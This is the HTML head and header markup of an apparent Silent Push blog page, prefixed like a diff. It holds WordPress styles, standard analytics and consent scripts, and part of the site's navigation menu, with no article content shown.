+ol,ul{box-sizing:border-box}:root :where(.wp-block-list.has-background){padding:1.25em 2.375em}
+/*# sourceURL=https://www.silentpush.com/wp-includes/blocks/list/style.min.css */
+</style>
+<style id="wp-block-paragraph-inline-css">
+.is-small-text{font-size:.875em}.is-regular-text{font-size:1em}.is-large-text{font-size:2.25em}.is-larger-text{font-size:3em}.has-drop-cap:not(:focus):first-letter{float:left;font-size:8.4em;font-style:normal;font-weight:100;line-height:.68;margin:.05em .1em 0 0;text-transform:uppercase}body.rtl .has-drop-cap:not(:focus):first-letter{float:none;margin-left:.1em}p.has-drop-cap.has-background{overflow:hidden}:root :where(p.has-background){padding:1.25em 2.375em}:where(p.has-text-color:not(.has-link-color)) a{color:inherit}p.has-text-align-left[style*="writing-mode:vertical-lr"],p.has-text-align-right[style*="writing-mode:vertical-rl"]{rotate:180deg}
+/*# sourceURL=https://www.silentpush.com/wp-includes/blocks/paragraph/style.min.css */
+</style>
+<style id="wp-block-buttons-inline-css">
+.wp-block-buttons{box-sizing:border-box}.wp-block-buttons.is-vertical{flex-direction:column}.wp-block-buttons.is-vertical>.wp-block-button:last-child{margin-bottom:0}.wp-block-buttons>.wp-block-button{display:inline-block;margin:0}.wp-block-buttons.is-content-justification-left{justify-content:flex-start}.wp-block-buttons.is-content-justification-left.is-vertical{align-items:flex-start}.wp-block-buttons.is-content-justification-center{justify-content:center}.wp-block-buttons.is-content-justification-center.is-vertical{align-items:center}.wp-block-buttons.is-content-justification-right{justify-content:flex-end}.wp-block-buttons.is-content-justification-right.is-vertical{align-items:flex-end}.wp-block-buttons.is-content-justification-space-between{justify-content:space-between}.wp-block-buttons.aligncenter{text-align:center}.wp-block-buttons:not(.is-content-justification-space-between,.is-content-justification-right,.is-content-justification-left,.is-content-justification-center) .wp-block-button.aligncenter{margin-left:auto;margin-right:auto;width:100%}.wp-block-buttons[style*=text-decoration] .wp-block-button,.wp-block-buttons[style*=text-decoration] .wp-block-button__link{text-decoration:inherit}.wp-block-buttons.has-custom-font-size .wp-block-button__link{font-size:inherit}.wp-block-buttons .wp-block-button__link{width:100%}.wp-block-button.aligncenter{text-align:center}
+/*# sourceURL=https://www.silentpush.com/wp-includes/blocks/buttons/style.min.css */
+</style>
+<style id="wp-block-separator-inline-css">
+@charset "UTF-8";.wp-block-separator{border:none;border-top:2px solid}:root :where(.wp-block-separator.is-style-dots){height:auto;line-height:1;text-align:center}:root :where(.wp-block-separator.is-style-dots):before{color:currentColor;content:"···";font-family:serif;font-size:1.5em;letter-spacing:2em;padding-left:2em}.wp-block-separator.is-style-dots{background:none!important;border:none!important}
+/*# sourceURL=https://www.silentpush.com/wp-includes/blocks/separator/style.min.css */
+</style>
+<style id="wp-block-table-inline-css">
+.wp-block-table{overflow-x:auto}.wp-block-table table{border-collapse:collapse;width:100%}.wp-block-table thead{border-bottom:3px solid}.wp-block-table tfoot{border-top:3px solid}.wp-block-table td,.wp-block-table th{border:1px solid;padding:.5em}.wp-block-table .has-fixed-layout{table-layout:fixed;width:100%}.wp-block-table .has-fixed-layout td,.wp-block-table .has-fixed-layout th{word-break:break-word}.wp-block-table.aligncenter,.wp-block-table.alignleft,.wp-block-table.alignright{display:table;width:auto}.wp-block-table.aligncenter td,.wp-block-table.aligncenter th,.wp-block-table.alignleft td,.wp-block-table.alignleft th,.wp-block-table.alignright td,.wp-block-table.alignright th{word-break:break-word}.wp-block-table .has-subtle-light-gray-background-color{background-color:#f3f4f5}.wp-block-table .has-subtle-pale-green-background-color{background-color:#e9fbe5}.wp-block-table .has-subtle-pale-blue-background-color{background-color:#e7f5fe}.wp-block-table .has-subtle-pale-pink-background-color{background-color:#fcf0ef}.wp-block-table.is-style-stripes{background-color:initial;border-collapse:inherit;border-spacing:0}.wp-block-table.is-style-stripes tbody tr:nth-child(odd){background-color:#f0f0f0}.wp-block-table.is-style-stripes.has-subtle-light-gray-background-color tbody tr:nth-child(odd){background-color:#f3f4f5}.wp-block-table.is-style-stripes.has-subtle-pale-green-background-color tbody tr:nth-child(odd){background-color:#e9fbe5}.wp-block-table.is-style-stripes.has-subtle-pale-blue-background-color tbody tr:nth-child(odd){background-color:#e7f5fe}.wp-block-table.is-style-stripes.has-subtle-pale-pink-background-color tbody tr:nth-child(odd){background-color:#fcf0ef}.wp-block-table.is-style-stripes td,.wp-block-table.is-style-stripes th{border-color:#0000}.wp-block-table.is-style-stripes{border-bottom:1px solid #f0f0f0}.wp-block-table .has-border-color td,.wp-block-table .has-border-color th,.wp-block-table .has-border-color tr,.wp-block-table .has-border-color>*{border-color:inherit}.wp-block-table table[style*=border-top-color] tr:first-child,.wp-block-table table[style*=border-top-color] tr:first-child td,.wp-block-table table[style*=border-top-color] tr:first-child th,.wp-block-table table[style*=border-top-color]>*,.wp-block-table table[style*=border-top-color]>* td,.wp-block-table table[style*=border-top-color]>* th{border-top-color:inherit}.wp-block-table table[style*=border-top-color] tr:not(:first-child){border-top-color:initial}.wp-block-table table[style*=border-right-color] td:last-child,.wp-block-table table[style*=border-right-color] th,.wp-block-table table[style*=border-right-color] tr,.wp-block-table table[style*=border-right-color]>*{border-right-color:inherit}.wp-block-table table[style*=border-bottom-color] tr:last-child,.wp-block-table table[style*=border-bottom-color] tr:last-child td,.wp-block-table table[style*=border-bottom-color] tr:last-child th,.wp-block-table table[style*=border-bottom-color]>*,.wp-block-table table[style*=border-bottom-color]>* td,.wp-block-table table[style*=border-bottom-color]>* th{border-bottom-color:inherit}.wp-block-table table[style*=border-bottom-color] tr:not(:last-child){border-bottom-color:initial}.wp-block-table table[style*=border-left-color] td:first-child,.wp-block-table table[style*=border-left-color] th,.wp-block-table table[style*=border-left-color] tr,.wp-block-table table[style*=border-left-color]>*{border-left-color:inherit}.wp-block-table table[style*=border-style] td,.wp-block-table table[style*=border-style] th,.wp-block-table table[style*=border-style] tr,.wp-block-table table[style*=border-style]>*{border-style:inherit}.wp-block-table table[style*=border-width] td,.wp-block-table table[style*=border-width] th,.wp-block-table table[style*=border-width] tr,.wp-block-table table[style*=border-width]>*{border-style:inherit;border-width:inherit}
+/*# sourceURL=https://www.silentpush.com/wp-includes/blocks/table/style.min.css */
+</style>
+
+
+<link rel='stylesheet' id='content-control-block-styles-css' href='https://www.silentpush.com/wp-content/plugins/content-control/dist/style-block-editor.css?ver=2.6.5' media='all' />
+<style id="global-styles-inline-css">
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(body) { margin: 0; }:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;font-style: inherit;font-weight: inherit;letter-spacing: inherit;line-height: inherit;padding-top: calc(0.667em + 2px);padding-right: calc(1.333em + 2px);padding-bottom: calc(0.667em + 2px);padding-left: calc(1.333em + 2px);text-decoration: none;text-transform: inherit;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+/*# sourceURL=global-styles-inline-css */
+</style>
+
+<link rel='stylesheet' id='google-fonts-css' href='https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@300;400;500;600;700&#038;family=Share+Tech+Mono&#038;display=swap' media='all' />
+<link rel='stylesheet' id='theme-single-common-css' href='https://www.silentpush.com/wp-content/themes/silentpush/assets/css/single-common.css?ver=21' media='all' />
+<link rel='stylesheet' id='theme-gutenberg-css' href='https://www.silentpush.com/wp-content/themes/silentpush/assets/css/gutenberg.css?ver=21' media='all' />
+<link rel='stylesheet' id='punch-core-gutenberg-css' href='https://www.silentpush.com/wp-content/themes/punch/assets/css/gutenberg.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='avia-merged-styles-css' href='https://www.silentpush.com/wp-content/uploads/dynamic_avia/avia-merged-styles-5fb651b36dc9fcb2dd968984fd0ed312---6aa119fd7a00b.css' media='all' />
+<script async data-wp-strategy="async" id="monsterinsights-frontend-script-js" src="https://www.silentpush.com/wp-content/plugins/google-analytics-for-wordpress/assets/js/frontend-gtag.min.js?ver=11.3.0"></script>
+<script data-cfasync="false" data-wpfc-render="false" type="text/javascript" id='monsterinsights-frontend-script-js-extra'>/* <![CDATA[ */
+var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[{\"path\":\"\\\/go\\\/\",\"label\":\"affiliate\"},{\"path\":\"\\\/recommend\\\/\",\"label\":\"affiliate\"}]","home_url":"https:\/\/www.silentpush.com","hash_tracking":"false","v4_id":"G-Y982JNG573"};/* ]]> */
+</script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.silentpush.com/xmlrpc.php?rsd" />
+<link rel='shortlink' href='https://www.silentpush.com/?p=13877' />
+			<!-- DO NOT COPY THIS SNIPPET! Start of Page Analytics Tracking for HubSpot WordPress plugin v11.3.75-->
+			<script class="hsq-set-content-id" data-content-id="blog-post">
+				var _hsq = _hsq || [];
+				_hsq.push(["setContentType", "blog-post"]);
+			</script>
+			<!-- DO NOT COPY THIS SNIPPET! End of Page Analytics Tracking for HubSpot WordPress plugin -->
+			<script type="text/javascript">
+        // create dataLayer
+        window.dataLayer = window.dataLayer || [];
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+
+        // set "denied" as default for both ad and analytics storage, as well as ad_user_data and ad_personalization,
+        gtag("consent", "default", {
+            ad_user_data: "denied",
+            ad_personalization: "denied",
+            ad_storage: "denied",
+            analytics_storage: "denied",
+            wait_for_update: 2000 // milliseconds to wait for update
+        });
+
+        // Enable ads data redaction by default [optional]
+        gtag("set", "ads_data_redaction", true);
+        gtag("consent", "default", {
+        ad_storage: "granted",
+        analytics_storage: "granted",
+        functionality_storage: "granted",
+        personalization_storage: "granted",
+        security_storage: "granted",
+        region: ["US"],
+        ad_user_data: "granted",
+        ad_personalization: "granted"
+    });
+    </script>
+
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-TDR48BL3');</script>
+<!-- End Google Tag Manager -->
+
+
+<script id="usercentrics-cmp" src="https://app.usercentrics.eu/browser-ui/latest/loader.js" data-ruleset-id="EC3KrkRjiys6iL" async></script>
+
+<script>var t_code = "DS-14348-3876-982";</script>
+		<script src="//ds360.co/track/script.js"></script>
+    <style>
+        :root{
+                    }
+
+
+        /* Section */
+        
+        
+
+        /* Buttons */
+                                                h1, .h1 .av-special-heading-tag{
+                                                                    }
+                                                            h2, .h2 .av-special-heading-tag{
+                                                                    }
+                                                            h3, .h3 .av-special-heading-tag{
+                                                                    }
+                                                            h4, .h4 .av-special-heading-tag{
+                                                                    }
+                                                            h5, .h5 .av-special-heading-tag{
+                                                                    }
+                                                            h6, .h6 .av-special-heading-tag{
+                                                                    }
+                                </style>
+    <link rel="profile" href="http://gmpg.org/xfn/11" />
+<link rel="alternate" type="application/rss+xml" title="Silent Push RSS2 Feed" href="https://www.silentpush.com/feed/" />
+<link rel="pingback" href="https://www.silentpush.com/xmlrpc.php" />
+	<script>document.addEventListener("DOMContentLoaded",function(){document.documentElement.style.setProperty("--scrollBarWidth",window.innerWidth-document.body.clientWidth+"px")});</script>
+	<style>.ep-lottie-loaded{opacity:1!important}</style>	<noscript>
+		<link rel="stylesheet" href="https://www.silentpush.com/wp-content/themes/punch/assets/css/dist/no-js.css?v=1.0.94">
+	</noscript>
+    
+<link rel="icon" href="https://www.silentpush.com/wp-content/uploads/FAVICON-1.png" type="image/png">
+
+<!-- To speed up the rendering and to display the site as fast as possible to the user we include some styles and scripts for above the fold content inline -->
+<script type="text/javascript">'use strict';var avia_is_mobile=!1;if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&'ontouchstart' in document.documentElement){avia_is_mobile=!0;document.documentElement.className+=' avia_mobile '}
+else{document.documentElement.className+=' avia_desktop '};document.documentElement.className+=' js_active avia_transform avia_transform3d ';</script><style id="wp-custom-css">
+code {
+  background-color: #6795ff26;
+	color: #6795ff;
+  border-radius: 6px;
+  font-family: monospace, monospace;
+  padding: 0 3px;
+}
+
+
+
+.flex-column-overlay + .ep-column-inner {
+    position: relative;
+}
+
+div#hs-eu-cookie-confirmation{
+	top: inherit !important;
+	bottom: 0 !important;
+}
+
+<!-- Button Styling Override -->
+.forms--hbspot .hbspt-form form .hs_submit .hs-button {
+    text-transform: uppercase !important;
+    max-width: fit-content !important;
+}
+
+.hs-form-7c300d14-b3d7-4586-9db1-6a9f4749a440_91e7789f-aa10-4030-b171-c2a2583fa3fb fieldset{
+	
+max-width: 800px !important;
+}
+
+/* Scrollable code block */
+.scrollable-code {
+  background: #000000;       /* light grey background */
+  border: 1px solid #ddd;    /* subtle border */
+  padding: 1em;              /* some breathing room */
+  margin: 1em 0;             /* space above/below */
+  overflow-x: auto;          /* horizontal scrollbar */
+  overflow-y: auto;          /* vertical scrollbar if needed */
+  max-width: 100%;           /* never exceed container */
+  white-space: pre;          /* preserve formatting */
+  font-family: Menlo, Consolas, monospace;
+  font-size: 0.7em;
+  line-height: 1.4;
+}
+
+.forms--hbspot .hs-button.primary {
+  background-color: #f0634b !important;
+  border-color: #f0634b !important;
+}
+
+.postsgrid--masonry .ep-posts-grid .ep-item:nth-child(1) .ep-item-image{
+	aspect-ratio: 225.385 / 126.785 !important;
+}
+
+
+
+</style>
+<style type='text/css'>
+@font-face {font-family: 'fa-fontello'; font-weight: normal; font-style: normal; font-display: auto;
+src: url('https://www.silentpush.com/wp-content/themes/punch/assets/fonts/fa-fontello.woff2?ver=21') format('woff2'),
+url('https://www.silentpush.com/wp-content/themes/punch/assets/fonts/fa-fontello.woff?ver=21') format('woff'),
+url('https://www.silentpush.com/wp-content/themes/punch/assets/fonts/fa-fontello.ttf?ver=21') format('truetype'),
+url('https://www.silentpush.com/wp-content/themes/punch/assets/fonts/fa-fontello.svg?ver=21#fa-fontello') format('svg'),
+url('https://www.silentpush.com/wp-content/themes/punch/assets/fonts/fa-fontello.eot?ver=21'),
+url('https://www.silentpush.com/wp-content/themes/punch/assets/fonts/fa-fontello.eot?ver=21#iefix') format('embedded-opentype');
+} #top .avia-font-fa-fontello, body .avia-font-fa-fontello, html body [data-av_iconfont='fa-fontello']:before{ font-family: 'fa-fontello'; }
+
+@font-face {font-family: 'silent-push-icons'; font-weight: normal; font-style: normal; font-display: auto;
+src: url('https://www.silentpush.com/wp-content/uploads/avia_fonts/silent-push-icons/silent-push-icons.woff2?ver=21') format('woff2'),
+url('https://www.silentpush.com/wp-content/uploads/avia_fonts/silent-push-icons/silent-push-icons.woff?ver=21') format('woff'),
+url('https://www.silentpush.com/wp-content/uploads/avia_fonts/silent-push-icons/silent-push-icons.ttf?ver=21') format('truetype'),
+url('https://www.silentpush.com/wp-content/uploads/avia_fonts/silent-push-icons/silent-push-icons.svg?ver=21#silent-push-icons') format('svg'),
+url('https://www.silentpush.com/wp-content/uploads/avia_fonts/silent-push-icons/silent-push-icons.eot?ver=21'),
+url('https://www.silentpush.com/wp-content/uploads/avia_fonts/silent-push-icons/silent-push-icons.eot?ver=21#iefix') format('embedded-opentype');
+} #top .avia-font-silent-push-icons, body .avia-font-silent-push-icons, html body [data-av_iconfont='silent-push-icons']:before{ font-family: 'silent-push-icons'; }
+</style>
+
+<!--
+Debugging Info for Theme support: 
+
+Theme: Punch
+Version: 1.0.96
+Installed: punch
+AviaFramework Version: 5.2
+AviaBuilder Version: 5.2
+aviaElementManager Version: 1.0.1
+- - - - - - - - - - -
+ChildTheme: Silent Push
+ChildTheme Version: 1.0.1
+ChildTheme Installed: punch
+
+- - - - - - - - - - -
+ML:512-PU:46-PLA:33
+WP:7.0.5
+Compress: CSS:all theme files - JS:all theme files
+Updates: disabled
+PLAu:32
+-->
+<style id="core-block-supports-inline-css">
+.wp-container-core-buttons-is-layout-fe48e5de{justify-content:center;}
+/*# sourceURL=core-block-supports-inline-css */
+</style>
+
+</head>
+
+<body id="top" class="wp-singular post-template-default single single-post postid-13877 single-format-standard wp-theme-punch wp-child-theme-silentpush no_sidebar_border rtl_columns av-curtain-numeric avia-responsive-images-support">
+
+	<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TDR48BL3" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+	<div id='wrap_all'>
+
+	
+<div id="header" class="header  has-bar">
+			<div class="announcement-banner">
+			<div class="announcement-banner-inner">
+									<a href="https://www.silentpush.com/6-1-product-launch/">
+								Silent Push 6.1 is here | See what's new									</a>
+								<button class="close-bar" onClick="(function(){ document.getElementById('header').classList.remove('has-bar'); document.documentElement.classList.add('banner-is-close'); })()">X</button>
+			</div>
+		</div>
+		<div class="header-inner">
+		<div class="header-logo">
+				<a href="https://www.silentpush.com" class="logo logo-type-image" aria-label="Silent Push Logo">
+		<div class='logo-main'><img width="502" height="88" src="https://www.silentpush.com/wp-content/uploads/Silent-Push-Logo-@2x.png" class="attachment-full size-full" alt="Silent Push logo" decoding="async" /></div><div class='logo-alternate'><img width="971" height="168" src="https://www.silentpush.com/wp-content/uploads/Silent-Push-Logo-Alternate@2x.png" class="attachment-full size-full" alt="Silent Push logo" decoding="async" fetchpriority="high" /></div>    </a>
+			</div>
+		<div class="header-menu">
+			<div class="menu-main-menu-container"><ul id="menu-main-menu" class="main-menu" role="menu"><li role="menuitem" id="menu-item-635" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-1"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Platform</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-11961" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/platform/" tabindex="0"><span class="avia-menu-text">Overview</span></a></li>
+	<li role="menuitem" id="menu-item-638" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/threat-hunting/" tabindex="0"><span class="avia-menu-text">Threat Hunting</span></a></li>
+	<li role="menuitem" id="menu-item-639" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/brand-protection/" tabindex="0"><span class="avia-menu-text">Brand Protection</span></a></li>
+	<li role="menuitem" id="menu-item-637" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/automated-intelligence/" tabindex="0"><span class="avia-menu-text">Automated Intelligence</span></a></li>
+	<li role="menuitem" id="menu-item-14643" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/traffic-origin/" tabindex="0"><span class="avia-menu-text">Traffic Origin</span></a></li>
+	<li role="menuitem" id="menu-item-640" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/api/" tabindex="0"><span class="avia-menu-text">API</span></a></li>
+	<li role="menuitem" id="menu-item-652" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/integrations/" tabindex="0"><span class="avia-menu-text">Integrations</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-642" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-2"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Solutions</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-12893" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/the-silent-push-difference/" tabindex="0"><span class="avia-menu-text">The Silent Push Difference</span></a></li>
+	<li role="menuitem" id="menu-item-13033" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/solutions/industries/" tabindex="0"><span class="avia-menu-text">Industries</span></a></li>
+	<li role="menuitem" id="menu-item-10981" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/solutions/use-cases/" tabindex="0"><span class="avia-menu-text">Use Cases</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-646" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-3"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Company</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-13824" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/" tabindex="0"><span class="avia-menu-text">Our Story</span></a></li>
+	<li role="menuitem" id="menu-item-648" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/team/" tabindex="0"><span class="avia-menu-text">Leadership Team</span></a></li>
+	<li role="menuitem" id="menu-item-13221" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/news/" tabindex="0"><span class="avia-menu-text">News</span></a></li>
+	<li role="menuitem" id="menu-item-650" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.silentpush.com/company/partners/" tabindex="0"><span class="avia-menu-text">Partners</span></a></li>
